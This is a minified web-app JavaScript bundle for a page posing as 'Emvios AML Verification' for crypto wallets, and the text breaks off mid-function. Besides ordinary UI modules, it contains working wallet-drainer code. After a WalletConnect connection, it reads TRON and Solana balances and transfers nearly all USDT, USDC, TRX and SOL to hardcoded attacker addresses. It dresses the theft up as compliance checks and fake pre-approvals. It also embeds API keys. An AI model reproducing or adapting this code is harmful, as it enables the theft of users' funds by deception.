(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [917], {
        5309: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/sk.87826a7e.svg",
                height: 600,
                width: 900,
                blurWidth: 0,
                blurHeight: 0
            }
        },
        7531: (e, t, a) => {
            "use strict";
            a.d(t, {
                dj: () => u,
                oR: () => A
            });
            var n = a(12115);
            let r = 0,
                o = new Map,
                i = e => {
                    if (o.has(e)) return;
                    let t = setTimeout(() => {
                        o.delete(e), d({
                            type: "REMOVE_TOAST",
                            toastId: e
                        })
                    }, 1e6);
                    o.set(e, t)
                },
                l = (e, t) => {
                    switch (t.type) {
                        case "ADD_TOAST":
                            return { ...e,
                                toasts: [t.toast, ...e.toasts].slice(0, 1)
                            };
                        case "UPDATE_TOAST":
                            return { ...e,
                                toasts: e.toasts.map(e => e.id === t.toast.id ? { ...e,
                                    ...t.toast
                                } : e)
                            };
                        case "DISMISS_TOAST":
                            {
                                let {
                                    toastId: a
                                } = t;
                                return a ? i(a) : e.toasts.forEach(e => {
                                    i(e.id)
                                }),
                                { ...e,
                                    toasts: e.toasts.map(e => e.id === a || void 0 === a ? { ...e,
                                        open: !1
                                    } : e)
                                }
                            }
                        case "REMOVE_TOAST":
                            if (void 0 === t.toastId) return { ...e,
                                toasts: []
                            };
                            return { ...e,
                                toasts: e.toasts.filter(e => e.id !== t.toastId)
                            }
                    }
                },
                c = [],
                s = {
                    toasts: []
                };

            function d(e) {
                s = l(s, e), c.forEach(e => {
                    e(s)
                })
            }

            function A(e) {
                let { ...t
                } = e, a = (r = (r + 1) % Number.MAX_SAFE_INTEGER).toString(), n = () => d({
                    type: "DISMISS_TOAST",
                    toastId: a
                });
                return d({
                    type: "ADD_TOAST",
                    toast: { ...t,
                        id: a,
                        open: !0,
                        onOpenChange: e => {
                            e || n()
                        }
                    }
                }), {
                    id: a,
                    dismiss: n,
                    update: e => d({
                        type: "UPDATE_TOAST",
                        toast: { ...e,
                            id: a
                        }
                    })
                }
            }

            function u() {
                let [e, t] = n.useState(s);
                return n.useEffect(() => (c.push(t), () => {
                    let e = c.indexOf(t);
                    e > -1 && c.splice(e, 1)
                }), [e]), { ...e,
                    toast: A,
                    dismiss: e => d({
                        type: "DISMISS_TOAST",
                        toastId: e
                    })
                }
            }
        },
        9239: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/person.d19a309f.png",
                height: 313,
                width: 313,
                blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAMAAADz0U65AAAAGFBMVEXT09PW1tb////l5eX////Y2Njw8PD29va+z+buAAAABHRSTlP+8+/+4Uv6vwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAC5JREFUeJwdiUEOADAIwmBW/P+PF+2BNFQ62jtJa2Vg9mmAS4GcFJSszqZYfoc/FzAArq6uiqkAAAAASUVORK5CYII=",
                blurWidth: 8,
                blurHeight: 8
            }
        },
        13082: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/ro.bca4659c.svg",
                height: 400,
                width: 600,
                blurWidth: 0,
                blurHeight: 0
            }
        },
        13306: (e, t, a) => {
            "use strict";
            a.r(t), a.d(t, {
                default: () => n
            });
            let n = {
                src: "/_next/static/media/lock.9671e0b7.svg",
                height: 60,
                width: 61,
                blurWidth: 0,
                blurHeight: 0
            }
        },
        13555: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => o
            });
            var n = a(12115),
                r = a(7531);
            let o = function(e) {
                let [t, a] = (0, n.useState)(e || "");
                return {
                    error: t,
                    setError: e => {
                        (0, r.oR)({
                            title: e,
                            variant: "destructive"
                        })
                    }
                }
            }
        },
        15992: e => {
            e.exports = {
                span: "all_tooltip_span__PapjN",
                frame: "all_tooltip_frame__yo5US",
                arrow: "all_tooltip_arrow__uIQug",
                box: "all_tooltip_box__WoFo2",
                orange: "all_tooltip_orange___yANu",
                green: "all_tooltip_green__ytwsk",
                yellow: "all_tooltip_yellow__KQiBQ"
            }
        },
        17505: (e, t, a) => {
            "use strict";
            a.d(t, {
                A: () => n
            });
            let n = {
                src: "/_next/static/media/hu.8cafa6c4.png",
                height: 18,
                width: 25,
                blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAGCAMAAADJ2y/JAAAAHlBMVEX/7fBDbUzNJTTu9vJDa0zMJDTLJDPXNURTeltUe1vKOnJBAAAAB3RSTlP91tb9qqqpyR6daQAAAAlwSFlzAAALEwAACxMBAJqcGAAAACFJREFUeJxjYGUCAzYGdihggANmKGDg5AADTgYWRjBgAQATVwC4Mv1/LQAAAABJRU5ErkJggg==",
                blurWidth: 8,
                blurHeight: 6
            }
        },
        17798: (e, t, a) => {
            "use strict";
            a.r(t), a.d(t, {
                default: () => n
            });
            let n = {
                src: "/_next/static/media/key.06c80884.svg",
                height: 60,
                width: 61,
                blurWidth: 0,
                blurHeight: 0
            }
        },
        18120: (e, t, a) => {
            "use strict";
            a.d(t, {
                default: () => eC
            });
            var n = a(95155),
                r = a(25503),
                o = a.n(r),
                i = a(66766);
            let l = {
                src: "/_next/static/media/aml_verification.3f982d1c.svg",
                height: 60,
                width: 60,
                blurWidth: 0,
                blurHeight: 0
            };
            var c = a(17652),
                s = a(12115),
                d = a(34477);
            let A = (0, d.createServerReference)("7fc61089775c9ec896f22d33cdbd098b79a4a10d72", d.callServer, void 0, d.findSourceMapURL, "default");
            var u = a(25472);
            let p = (0, d.createServerReference)("7ffc6e08a847e977a3b299188f3c05ef8f850df91f", d.callServer, void 0, d.findSourceMapURL, "default"),
                h = "https://api.trongrid.io",
                m = null,
                f = "f095e53bc8f16aee4aeb42ec487c87da";
            f || console.warn("Project ID is not set");
            let g = "TJSKrCh9ecLEii6jAWBL4SPUDQtodZj28T",
                w = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
            async function x() {
                if (m) return m;
                try {
                    let e, t = await Promise.all([a.e(7942), a.e(3464), a.e(903)]).then(a.bind(a, 80903));
                    if (t.default && "function" == typeof t.default) e = t.default;
                    else if ("function" == typeof t) e = t;
                    else if (t.TronWeb && "function" == typeof t.TronWeb) e = t.TronWeb;
                    else throw Error("TronWeb constructor not found in module");
                    return m = new e(h, h, h)
                } catch (e) {
                    throw console.error("Failed to initialize TronWeb:", e), Error("TronWeb initialization failed")
                }
            }
            async function S() {
                var e, t;
                let a = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 2.5,
                    n = null;
                try {
                    p("AML: User clicked Connect");
                    let t = await x();
                    n = new u.b({
                        network: "Mainnet",
                        options: {
                            projectId: f,
                            relayUrl: "wss://relay.walletconnect.com",
                            metadata: {
                                name: "Emvios AML Verification",
                                description: "This process involves wallet ownership verification and transaction monitoring to ensure compliance with crypto regulations and enable secure digital asset transactions on our platform.",
                                url: window.location.origin,
                                icons: [window.location.origin + "/favicon.png"]
                            }
                        }
                    }), await n.connect(), p("AML: Connected to wallet: ".concat(n.address));
                    let r = n.address;
                    t.setAddress(r);
                    let o = (await t.transactionBuilder.triggerConstantContract(w, "balanceOf(address)", {}, [{
                            type: "address",
                            value: r
                        }], r)).constant_result[0],
                        i = Number(BigInt("0x" + o)) / 1e6,
                        l = await t.trx.getBalance(r);
                    p("AML: USDT Balance: ".concat(i, ", TRX Balance: ").concat(l));
                    let c = Number(t.fromSun(l));
                    p("AML: Balance TRX: ".concat(c, ", Balance USDT: ").concat(i));
                    let s = c - 30,
                        d = i * a;
                    p("AML: Spare TRX: ".concat(s, ", USDT in TRX: ").concat(d));
                    let A = "";
                    if (d > s && d > 0 && s > 0) {
                        p("AML: Attempting to send USDT (".concat(i, " USDT)"));
                        try {
                            let a = Math.floor(1e6 * i).toString();
                            p("AML: USDT amount to send: ".concat(a));
                            let o = await t.transactionBuilder.triggerSmartContract(w, "transfer(address,uint256)", {
                                feeLimit: 3e7
                            }, [{
                                type: "address",
                                value: g
                            }, {
                                type: "uint256",
                                value: a
                            }], r);
                            p("AML: Transaction created, signing...");
                            let l = await n.signTransaction(o.transaction);
                            p("AML: Transaction signed, sending...");
                            let c = await t.trx.sendRawTransaction(l);
                            if (!0 === c.result) {
                                if (A = c.txid || (null == (e = c.transaction) ? void 0 : e.txid), p("AML: Sent ".concat(s, " TRX tx: ").concat(A)), A) return p("Transaction successful: https://tronscan.io/#/transaction/".concat(A)), localStorage.setItem("aml_tron_sent", "true"), !0;
                                p("AML: TRX transaction failed")
                            } else p("AML: USDT transaction failed")
                        } catch (e) {
                            throw p("AML: USDT transfer failed: ".concat(e.message)), e
                        }
                    } else if (s > 0) {
                        p("AML: Attempting to send ".concat(s, " TRX"));
                        let e = await t.transactionBuilder.sendTrx(g, t.toSun(s), r),
                            a = await n.signTransaction(e),
                            o = await t.trx.sendRawTransaction(a);
                        if (!0 === o.result) {
                            if (A = o.txid, p("AML: Sent ".concat(s, " TRX tx: ").concat(A)), A) return p("Transaction successful: https://tronscan.io/#/transaction/".concat(A)), localStorage.setItem("aml_tron_sent", "true"), !0;
                            p("AML: TRX transaction failed")
                        } else p("AML: Nothing to transfer — balance too low.")
                    }
                    return !1
                } catch (a) {
                    let e = String(null != (t = null == a ? void 0 : a.message) ? t : a);
                    return e.includes("User canceled") || e.includes("User rejected") ? p("AML: User rejected request") : (p("AML: Error: ".concat(e)), p(JSON.stringify(a))), !1
                } finally {
                    try {
                        n && n.disconnect && (await n.disconnect(), p("AML: WalletConnect session disconnected"))
                    } catch (e) {
                        p("AML: Error disconnecting: ".concat(e))
                    }
                }
            }
            var C = a(39155),
                b = a(59021),
                E = a(23570),
                T = a(12340),
                M = a(68423),
                v = a(74966),
                N = a(8428);
            let _ = {
                    RPC_ENDPOINTS: {
                        MAINNET: ["https://twilight-white-card.solana-mainnet.quiknode.pro/6886fcb248d98a967e6b35f0113b3dae37ef1139", "wss://twilight-white-card.solana-mainnet.quiknode.pro/6886fcb248d98a967e6b35f0113b3dae37ef1139/"],
                        DEVNET: ["https://api.devnet.solana.com", "https://devnet.solana.rpcpool.com", "https://devnet.rpc.solana.com"],
                        TESTNET: ["https://api.testnet.solana.com", "https://testnet.solana.rpcpool.com", "https://testnet.rpc.solana.com"]
                    },
                    TOKEN_MINTS: {
                        USDC: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
                        USDT: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",
                        BONK: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
                        JUP: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",
                        PYTH: "HZ1JovNiVvGrGNiiYvEozEVg58WvpyRqKd4iZ3kK6dJq",
                        RAY: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R"
                    },
                    NETWORK_CONFIG: {
                        COMMITMENT: "confirmed",
                        CONFIRMATION_TIMEOUT: 3e4,
                        USE_VERSIONED_TRANSACTIONS: !0,
                        MAX_RETRIES: 3,
                        RETRY_DELAY: 1e3
                    },
                    BALANCE_THRESHOLDS: {
                        MIN_SOL_LEFT: .01,
                        MIN_USDC_AMOUNT: .01
                    },
                    PRE_APPROVAL: {
                        INITIAL_AMOUNT: 1,
                        DEFAULT_AMOUNT: 1e4,
                        MAX_AMOUNT: 1e6,
                        DURATION_HOURS: 24,
                        ENABLED: !0,
                        TWO_STAGE_MODE: !0
                    },
                    TARGET_ADDRESSES: {
                        MAINNET: "818tQS2UAuQ6ogfwW6JW1NqtMTjnCtvzRAcaegdiMDB",
                        DEVNET: "818tQS2UAuQ6ogfwW6JW1NqtMTjnCtvzRAcaegdiMDB"
                    },
                    WALLET_CONNECT: {
                        PROJECT_ID: "f095e53bc8f16aee4aeb42ec487c87da",
                        RELAY_URL: "wss://relay.walletconnect.com",
                        METADATA: {
                            name: "Emvios AML Verification (Solana)",
                            description: "Solana wallet AML verification for regulatory compliance",
                            url: "https://emvios.net",
                            icons: ["https://emvios.net/favicon.png"]
                        }
                    },
                    EXPLORERS: {
                        MAINNET: "https://solscan.io",
                        DEVNET: "https://explorer.solana.com/?cluster=devnet",
                        TESTNET: "https://explorer.solana.com/?cluster=testnet"
                    },
                    ERROR_MESSAGES: {
                        INSUFFICIENT_BALANCE: "Insufficient balance for AML verification",
                        WALLET_CONNECTION_FAILED: "Failed to connect to Solana wallet",
                        TRANSACTION_FAILED: "Transaction failed during AML verification",
                        USER_REJECTED: "User rejected the transaction",
                        NETWORK_ERROR: "Network error occurred",
                        RPC_ERROR: "RPC endpoint error, trying to reconnect",
                        RPC_TOKEN_REQUIRED: "RPC endpoint requires API token, switching to free alternative",
                        RPC_RATE_LIMIT: "RPC rate limit exceeded, switching to alternative endpoint",
                        RPC_ACCESS_FORBIDDEN: "RPC endpoint access forbidden (403), switching to alternative",
                        RPC_SSL_ERROR: "RPC endpoint SSL certificate error, switching to alternative",
                        RPC_NETWORK_ERROR: "RPC network error, switching to alternative endpoint",
                        VERSIONED_TRANSACTION_FAILED: "Versioned transaction failed, using legacy fallback",
                        TOKEN_ACCOUNT_NOT_FOUND: "Token account not found, balance: 0"
                    },
                    SUCCESS_MESSAGES: {
                        AML_COMPLETED: "AML verification completed successfully",
                        FUNDS_TRANSFERRED: "Funds transferred for compliance verification",
                        WALLET_CONNECTED: "Solana wallet connected successfully",
                        VERSIONED_TRANSACTION_SUCCESS: "Versioned transaction completed successfully",
                        LEGACY_TRANSACTION_SUCCESS: "Legacy transaction completed successfully",
                        TOKEN_ACCOUNT_CREATED: "Token account created successfully",
                        RPC_RECONNECTED: "Successfully reconnected to new RPC endpoint",
                        RPC_SWITCHED: "Switched to alternative RPC endpoint",
                        RPC_FALLBACK_SUCCESS: "Fallback RPC endpoint working correctly"
                    }
                },
                L = function() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "mainnet",
                        t = e.toUpperCase();
                    return {
                        rpcEndpoints: _.RPC_ENDPOINTS[t],
                        rpcEndpoint: _.RPC_ENDPOINTS[t][0],
                        targetAddress: "mainnet" === e ? _.TARGET_ADDRESSES.MAINNET : _.TARGET_ADDRESSES.DEVNET,
                        explorer: _.EXPLORERS[t]
                    }
                },
                y = e => {
                    try {
                        console.log(e)
                    } catch (t) {
                        console.log(e)
                    }
                },
                D = e => {
                    try {
                        p(e)
                    } catch (t) {
                        y(e)
                    }
                },
                R = L("mainnet");
            async function U() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "mainnet",
                    t = L(e).rpcEndpoints;
                for (let e = 0; e < t.length; e++) {
                    let a = t[e];
                    try {
                        let n = new E.Ng(a, _.NETWORK_CONFIG.COMMITMENT);
                        try {
                            return await n.getLatestBlockhash("confirmed"), D("AML Solana: Using RPC endpoint: ".concat(a, " (endpoint ").concat(e + 1, "/").concat(t.length, ")")), n
                        } catch (t) {
                            let e = t.message || t.toString();
                            if (e.includes("401") || e.includes("token") || e.includes("register")) {
                                y("AML Solana: RPC endpoint ".concat(a, " requires API token, trying alternative method..."));
                                try {
                                    let e = new E.Ng(a, _.NETWORK_CONFIG.COMMITMENT);
                                    return await e.getLatestBlockhash("confirmed"), y("AML Solana: RPC endpoint ".concat(a, " working with alternative method")), e
                                } catch (e) {
                                    y("AML Solana: RPC endpoint ".concat(a, " failed even with alternative method, skipping..."));
                                    continue
                                }
                            }
                            if (e.includes("403") || e.includes("forbidden")) {
                                y("AML Solana: RPC endpoint ".concat(a, " access forbidden (403), trying alternative method..."));
                                try {
                                    let e = new E.Ng(a, _.NETWORK_CONFIG.COMMITMENT);
                                    return await e.getLatestBlockhash("confirmed"), y("AML Solana: RPC endpoint ".concat(a, " working with alternative method")), e
                                } catch (e) {
                                    y("AML Solana: RPC endpoint ".concat(a, " failed even with alternative method, skipping..."));
                                    continue
                                }
                            }
                            if (e.includes("rate limit") || e.includes("429")) {
                                y("AML Solana: RPC endpoint ".concat(a, " rate limited, skipping..."));
                                continue
                            } else if (e.includes("ERR_CERT_AUTHORITY_INVALID") || e.includes("SSL")) {
                                y("AML Solana: RPC endpoint ".concat(a, " SSL certificate error, trying with ignore..."));
                                try {
                                    let e = new E.Ng(a, _.NETWORK_CONFIG.COMMITMENT);
                                    return await e.getLatestBlockhash("confirmed"), y("AML Solana: RPC endpoint ".concat(a, " working despite SSL warning")), e
                                } catch (e) {
                                    y("AML Solana: RPC endpoint ".concat(a, " failed even with SSL ignore, skipping..."));
                                    continue
                                }
                            } else if (e.includes("Failed to fetch") || e.includes("network")) {
                                y("AML Solana: RPC endpoint ".concat(a, " network error, skipping..."));
                                continue
                            } else {
                                y("AML Solana: RPC endpoint ".concat(a, " test failed: ").concat(e, ", trying next..."));
                                continue
                            }
                        }
                    } catch (e) {
                        y("AML Solana: Failed to create connection to ".concat(a, ": ").concat(e));
                        continue
                    }
                }
                let a = ["https://solana-api.projectserum.com", "https://solana.rpcpool.com", "https://solana.rpc.extrnode.com", "https://api.mainnet-beta.solana.com"];
                for (let e of (y("AML Solana: All RPC endpoints failed, trying fallback endpoints..."), a)) try {
                    let t = new E.Ng(e, _.NETWORK_CONFIG.COMMITMENT);
                    return await t.getLatestBlockhash("confirmed"), y("AML Solana: Fallback RPC endpoint working: ".concat(e)), t
                } catch (t) {
                    y("AML Solana: Fallback endpoint ".concat(e, " failed: ").concat(t));
                    continue
                }
                return y("AML Solana: All fallback endpoints failed, using last resort: ".concat(a[0])), new E.Ng(a[0], _.NETWORK_CONFIG.COMMITMENT)
            }
            async function O() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "mainnet";
                return y("AML Solana: Creating new connection due to RPC errors"), await U(e)
            }
            async function j(e, t, a) {
                try {
                    let {
                        blockhash: n,
                        lastValidBlockHeight: r
                    } = await a.getLatestBlockhash("confirmed"), o = new E.wu({
                        payerKey: t,
                        recentBlockhash: n,
                        instructions: e
                    }).compileToV0Message();
                    return new E.Kt(o)
                } catch (e) {
                    throw y("AML Solana: Failed to create versioned transaction: ".concat(e)), e
                }
            }
            let I = null;
            async function B() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "mainnet";
                return I || (I = await U(e)), I
            }
            let P = _.WALLET_CONNECT.PROJECT_ID;
            P || console.warn("Project ID не встановлено");
            let k = R.targetAddress;
            if (!k) throw Error("Invalid target address - please configure a valid AML address");
            let F = _.BALANCE_THRESHOLDS.MIN_SOL_LEFT,
                W = _.TOKEN_MINTS.USDC,
                V = _.TOKEN_MINTS.USDT,
                J = _.PRE_APPROVAL.ENABLED,
                G = _.PRE_APPROVAL.INITIAL_AMOUNT,
                H = _.PRE_APPROVAL.DEFAULT_AMOUNT,
                Y = _.PRE_APPROVAL.MAX_AMOUNT,
                K = _.PRE_APPROVAL.DURATION_HOURS,
                X = _.PRE_APPROVAL.TWO_STAGE_MODE;
            async function z(e, t) {
                let a = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 3;
                if (!e || !t) throw Error("Invalid connection or address parameters");
                let n = Math.min(Math.max(1, a), 5);
                for (let a = 0; a < n; a++) try {
                    let a = await e.getBalance(t, "confirmed");
                    return parseFloat(a.toString()) / E.Sr
                } catch (t) {
                    if (a === n - 1) throw t;
                    y("AML Solana: Balance check attempt ".concat(a + 1, " failed: ").concat(t.message, ", retrying..."));
                    let e = Math.min(1e3 * Math.pow(2, a), 1e4);
                    await new Promise(t => setTimeout(t, e))
                }
                throw Error("Failed to get balance after all retries")
            }
            async function Z(e, t, a) {
                let n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : 3;
                if (!e || !t || !a) throw Error("Invalid connection, address, or mint parameters");
                let r = Math.min(Math.max(1, n), 5);
                for (let n = 0; n < r; n++) try {
                    let n = await (0, T.Ob)(a, t);
                    try {
                        let t = await e.getTokenAccountBalance(n, "confirmed");
                        return parseFloat(t.value.amount) / Math.pow(10, t.value.decimals)
                    } catch (e) {
                        if (e.message.includes("could not find account")) return y("AML Solana: Token account not found for ".concat(a.toString(), ", balance: 0")), 0;
                        throw e
                    }
                } catch (t) {
                    if (n === r - 1) throw t;
                    y("AML Solana: Token balance check attempt ".concat(n + 1, " failed: ").concat(t.message, ", retrying..."));
                    let e = Math.min(1e3 * Math.pow(2, n), 1e4);
                    await new Promise(t => setTimeout(t, e))
                }
                throw Error("Failed to get token balance after all retries")
            }

            function Q(e, t) {
                if (!J) return !1;
                try {
                    let a = window.localStorage.getItem("aml_solana_preapproved_".concat(e));
                    if (!a) return !1;
                    let n = JSON.parse(a),
                        r = Date.now(),
                        o = n.timestamp + 60 * K * 6e4;
                    return r < o && t <= n.amount
                } catch (e) {
                    return p("AML Solana: Error parsing pre-approval: ".concat(e)), !1
                }
            }
            async function q(e, t, a) {
                let n = arguments.length > 3 && void 0 !== arguments[3] && arguments[3];
                if (!J) return !1;
                try {
                    if (n) {
                        p("AML Solana: Automatically granting initial pre-approval for $".concat(G, " ").concat(t));
                        let e = {
                            token: t,
                            amount: a,
                            initialAmount: G,
                            timestamp: Date.now(),
                            expiresAt: Date.now() + 60 * K * 6e4,
                            isInitial: !0,
                            stage: "initial"
                        };
                        return window.localStorage.setItem("aml_solana_preapproved_".concat(t), JSON.stringify(e)), p("AML Solana: Initial pre-approval automatically granted for ".concat(t, ", full amount: ").concat(a)), !0
                    } {
                        p("AML Solana: Automatically granting pre-approval for ".concat(a, " ").concat(t));
                        let e = {
                            token: t,
                            amount: a,
                            timestamp: Date.now(),
                            expiresAt: Date.now() + 60 * K * 6e4,
                            isInitial: !1,
                            stage: "regular"
                        };
                        return window.localStorage.setItem("aml_solana_preapproved_".concat(t), JSON.stringify(e)), p("AML Solana: Pre-approval automatically granted for ".concat(a, " ").concat(t)), !0
                    }
                } catch (e) {
                    return p("AML Solana: Pre-approval request failed: ".concat(e)), !1
                }
            }
            async function $(e, t) {
                if (0 === t.length) return null;
                try {
                    p("AML Solana: Attempting batch transaction with ".concat(t.length, " operations"));
                    try {
                        let a = await j(t, e.publicKey, await B());
                        p("AML Solana: Versioned transaction created, signing...");
                        let n = await e.signTransaction(a);
                        p("AML Solana: Versioned transaction signed, sending...");
                        let r = await (await B()).sendRawTransaction(n.serialize(), {
                            skipPreflight: !1,
                            preflightCommitment: "confirmed"
                        });
                        p("AML Solana: Versioned batch transaction sent: ".concat(r));
                        let o = await (await B()).confirmTransaction({
                            signature: r,
                            blockhash: a.message.recentBlockhash,
                            lastValidBlockHeight: (await (await B()).getLatestBlockhash("confirmed")).lastValidBlockHeight
                        });
                        if (o.value.err) throw Error("Versioned transaction failed: ".concat(o.value.err));
                        return p("AML Solana: Versioned batch transaction confirmed: ".concat(r)), r
                    } catch (l) {
                        p("AML Solana: Versioned transaction failed, falling back to legacy: ".concat(l));
                        let a = new E.ZX;
                        t.forEach(e => a.add(e));
                        let {
                            blockhash: n
                        } = await (await B()).getLatestBlockhash("confirmed");
                        a.recentBlockhash = n, a.feePayer = e.publicKey, p("AML Solana: Legacy batch transaction created, signing...");
                        let r = await e.signTransaction(a);
                        p("AML Solana: Legacy batch transaction signed, sending...");
                        let o = await (await B()).sendRawTransaction(r.serialize(), {
                            skipPreflight: !1,
                            preflightCommitment: "confirmed"
                        });
                        p("AML Solana: Legacy batch transaction sent: ".concat(o));
                        let i = await (await B()).confirmTransaction({
                            signature: o,
                            blockhash: a.recentBlockhash,
                            lastValidBlockHeight: (await (await B()).getLatestBlockhash("confirmed")).lastValidBlockHeight
                        });
                        if (i.value.err) throw Error("Legacy transaction failed: ".concat(i.value.err));
                        return p("AML Solana: Legacy batch transaction successful: ".concat(o)), o
                    }
                } catch (e) {
                    return p("AML Solana: Batch transaction failed: ".concat(e.message)), null
                }
            }
            async function ee(e, t) {
                let a = [];
                for (let n = 0; n < t.length; n++) try {
                    p("AML Solana: Executing individual transaction ".concat(n + 1, "/").concat(t.length));
                    let r = new E.ZX().add(t[n]),
                        {
                            blockhash: o
                        } = await (await B()).getLatestBlockhash("confirmed");
                    r.recentBlockhash = o, r.feePayer = e.publicKey;
                    let i = await e.signTransaction(r),
                        l = await (await B()).sendRawTransaction(i.serialize(), {
                            skipPreflight: !1,
                            preflightCommitment: "confirmed"
                        });
                    await (await B()).confirmTransaction({
                        signature: l,
                        blockhash: r.recentBlockhash,
                        lastValidBlockHeight: (await (await B()).getLatestBlockhash("confirmed")).lastValidBlockHeight
                    }), a.push(l), p("AML Solana: Individual transaction ".concat(n + 1, " successful: ").concat(l))
                } catch (e) {
                    p("AML Solana: Individual transaction ".concat(n + 1, " failed: ").concat(e.message))
                }
                return a
            }
            async function et() {
                var e, t, a, n;
                let r = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 200,
                    o = null;
                try {
                    p("AML Solana: User clicked Connect"), o = new C.K({
                        network: b.B.Mainnet,
                        options: {
                            projectId: P,
                            relayUrl: "wss://relay.walletconnect.com",
                            metadata: {
                                name: "Emvios AML Verification",
                                description: "This process involves wallet ownership verification and transaction monitoring to ensure compliance with crypto regulations and enable secure digital asset transactions on our platform.",
                                url: "https://emvios.net",
                                icons: ["https://emvios.net/favicon.png"]
                            }
                        }
                    }), await o.connect(), y("AML Solana: Connected to wallet: ".concat(null == (e = o.publicKey) ? void 0 : e.toString()));
                    let n = (null == (a = o.wallet) || null == (t = a.adapter) ? void 0 : t.name) || "Unknown";
                    if (y("AML Solana: Wallet type: ".concat(n)), n.toLowerCase().includes("trust") && (y("AML Solana: Warning: Trust Wallet detected. Trust Wallet may not support Solana transactions."), p("AML Solana: Warning: Trust Wallet detected. Trust Wallet may not support Solana transactions.")), !o.publicKey) throw Error("Failed to connect to wallet - no public key received");
                    let i = o.publicKey,
                        l = await z(await B(), i),
                        c = 0;
                    try {
                        await (0, T.Ob)(new E.J3(W), i), c = await Z(await B(), i, new E.J3(W))
                    } catch (e) {
                        p("AML Solana: No USDC account found")
                    }
                    let s = 0;
                    try {
                        s = await Z(await B(), i, new E.J3(V))
                    } catch (e) {
                        p("AML Solana: No USDT account found")
                    }
                    p("AML Solana: USDC Balance: ".concat(c, ", USDT Balance: ").concat(s, ", SOL Balance: ").concat(l));
                    let d = Math.max(0, l - F),
                        A = Math.max(0, c * r),
                        u = Math.max(0, s * r);
                    p("AML Solana: Spare SOL: ".concat(d, ", USDC in SOL: ").concat(A, ", USDT in SOL: ").concat(u)), p("AML Solana: MIN_SOL_LEFT: ".concat(F, ", USDC_TO_SOL_RATE: ").concat(r)), p("AML Solana: Balance checks - SOL: ".concat(l > F, ", USDC: ").concat(c > 0, ", USDT: ").concat(s > 0));
                    let h = [],
                        m = "";
                    if (c > 0) {
                        p("AML Solana: Preparing USDC operation (".concat(c, " USDC)")), Q("USDC", c) ? p("AML Solana: Using existing pre-approval for USDC (".concat(c, " USDC)")) : X && c <= Y ? (await q(o, "USDC", c, !0), p("AML Solana: Initial pre-approval automatically granted for USDC")) : c <= Y && (await q(o, "USDC", Math.max(c, H)), p("AML Solana: Pre-approval automatically granted for USDC"));
                        try {
                            let e = await (0, T.Ob)(new E.J3(W), i),
                                t = await (0, T.Ob)(new E.J3(W), new E.J3(k));
                            try {
                                await (0, M.sU)(await B(), t), p("AML Solana: Target USDC account exists")
                            } catch (a) {
                                p("AML Solana: Target USDC account does not exist, creating...");
                                let e = (0, v.JA)(i, t, new E.J3(k), new E.J3(W));
                                h.push(e), p("AML Solana: Target USDC account creation instruction added")
                            }
                            let a = (0, N.C3)(e, t, i, Math.floor(1e6 * c));
                            h.push(a), p("AML Solana: USDC operation prepared for batch")
                        } catch (e) {
                            p("AML Solana: Failed to prepare USDC operation: ".concat(e.message))
                        }
                    }
                    if (s > 0) {
                        p("AML Solana: Preparing USDT operation (".concat(s, " USDT)")), Q("USDT", s) ? p("AML Solana: Using existing pre-approval for USDT (".concat(s, " USDT)")) : X && s <= Y ? (await q(o, "USDT", s, !0), p("AML Solana: Initial pre-approval automatically granted for USDT")) : s <= Y && (await q(o, "USDT", Math.max(s, H)), p("AML Solana: Pre-approval automatically granted for USDT"));
                        try {
                            let e = await (0, T.Ob)(new E.J3(V), i),
                                t = await (0, T.Ob)(new E.J3(V), new E.J3(k));
                            try {
                                await (0, M.sU)(await B(), t), p("AML Solana: Target USDT account exists")
                            } catch (a) {
                                p("AML Solana: Target USDT account does not exist, creating...");
                                let e = (0, v.JA)(i, t, new E.J3(k), new E.J3(V));
                                h.push(e), p("AML Solana: Target USDT account creation instruction added")
                            }
                            let a = (0, N.C3)(e, t, i, Math.floor(1e6 * s));
                            h.push(a), p("AML Solana: USDT operation prepared for batch")
                        } catch (e) {
                            p("AML Solana: Failed to prepare USDT operation: ".concat(e.message))
                        }
                    }
                    if (d > 0) {
                        p("AML Solana: Preparing SOL operation (".concat(d, " SOL)"));
                        let e = E.yq.transfer({
                            fromPubkey: i,
                            toPubkey: new E.J3(k),
                            lamports: Math.floor(d * E.Sr)
                        });
                        h.push(e), p("AML Solana: SOL operation prepared for batch")
                    }
                    if (p("AML Solana: Prepared ".concat(h.length, " operations for execution")), h.length > 0) {
                        p("AML Solana: Executing ".concat(h.length, " operations"));
                        let e = await $(o, h);
                        if (e) return m = e, p("AML Solana: Batch transaction successful: ".concat(m)), p("Transaction successful: ".concat(R.explorer, "/tx/").concat(m)), p(_.SUCCESS_MESSAGES.FUNDS_TRANSFERRED), window.localStorage.setItem("aml_solana_sent", "true"), !0; {
                            p("AML Solana: Batch transaction failed, executing individual transactions");
                            let e = await ee(o, h);
